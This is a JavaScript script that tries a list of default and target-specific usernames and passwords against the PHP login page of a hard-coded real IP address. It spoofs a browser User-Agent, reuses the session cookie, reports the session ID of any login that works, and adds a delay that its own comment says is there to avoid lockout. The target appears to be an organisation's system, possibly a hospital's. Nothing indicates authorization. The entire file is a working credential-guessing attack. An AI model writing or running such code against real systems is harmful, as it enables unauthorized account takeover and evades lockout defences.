const BASE = 'http://103.147.236.140';

async function tryLogin(username, password) {
  const getResp = await fetch(BASE + '/login/', {
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    },
  });
  const sessionId = getResp.headers.get('set-cookie')?.match(/PHPSESSID=([^;]+)/)?.[1];

  const postResp = await fetch(BASE + '/login/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
      'Cookie': `PHPSESSID=${sessionId}`,
    },
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    redirect: 'manual',
  });

  const location = postResp.headers.get('location');
  if (location && !location.includes('login')) {
    return { success: true, sessionId };
  }

  const body = await postResp.text();
  const alertMatch = body.match(/toastr\.error\([^)]+\)/i);
  return { success: false, error: alertMatch?.[0] || 'unknown error' };
}

async function main() {
  const creds = [
    { u: 'mbi', p: 'maintenis' },
    { u: 'admin', p: 'admin' },
    { u: 'admin', p: 'admin123' },
    { u: 'admin', p: 'password' },
    { u: 'administrator', p: 'administrator' },
    { u: 'user', p: 'user' },
    { u: 'mbi', p: 'mbi123' },
    { u: 'admin', p: 'maintenis' },
    { u: 'superadmin', p: 'superadmin' },
    { u: 'rsud', p: 'rsud' },
    { u: 'mbi', p: 'Mbi12345' },
  ];

  for (const c of creds) {
    const result = await tryLogin(c.u, c.p);
    if (result.success) {
      console.log(`✅ SUCCESS: ${c.u} / ${c.p} - Session: ${result.sessionId}`);
      return;
    }
    console.log(`❌ ${c.u} / ${c.p}: ${result.error?.substring(0, 80) || 'failed'}`);
    await new Promise(r => setTimeout(r, 500)); // delay to avoid lockout
  }
}

main().catch(console.error);
